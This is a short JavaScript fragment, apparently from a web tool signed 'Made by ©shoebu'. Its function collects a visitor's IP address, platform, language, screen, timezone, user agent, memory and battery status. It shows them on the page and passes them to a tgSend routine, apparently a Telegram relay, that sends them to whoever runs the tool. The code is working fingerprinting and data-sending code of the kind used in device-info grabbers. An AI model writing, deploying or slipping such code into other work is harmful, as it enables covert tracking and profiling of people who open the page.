// ===== DEVICE INFO =====
async function sendDeviceInfo(){
log('Collecting device info...');toast('📱 Collecting...');
const ip=await getIP();
const info={
'🌐 IP':ip,'📱 Platform':navigator.platform||'Unknown','🌍 Lang':navigator.language,
'📐 Screen':`${screen.width}x${screen.height}`,'🎨 Color':screen.colorDepth+'bit',
'🕐 TZ':Intl.DateTimeFormat().resolvedOptions().timeZone,'🍪 Cookies':navigator.cookieEnabled?'Yes':'No',
'📡 UA':navigator.userAgent.substring(0,100),'🧠 RAM':navigator.deviceMemory?navigator.deviceMemory+'GB':'Unknown'
};
try{if(navigator.getBattery){const b=await navigator.getBattery();info['🔋 Battery']=Math.round(b.level*100)+'%';info['🔋 Charging']=b.charging?'Yes':'No'}}catch(e){}
let msg='<b>📱 Device Info</b>\n\n',html='';
for(const[k,v]of Object.entries(info)){
msg+=`${k}: ${v}\n`;
html+=`<div style="display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #222;font-size:13px"><span style="color:#888">${k}</span><span style="color:#fff;max-width:55%;word-break:break-all">${v}</span></div>`;
}
msg+='\n👑 Made by ©shoebu';
document.getElementById('deviceInfoDisplay').innerHTML=html;
tgSend(msg);toast('📱 Info sent!');log('✅ Device info sent');
}

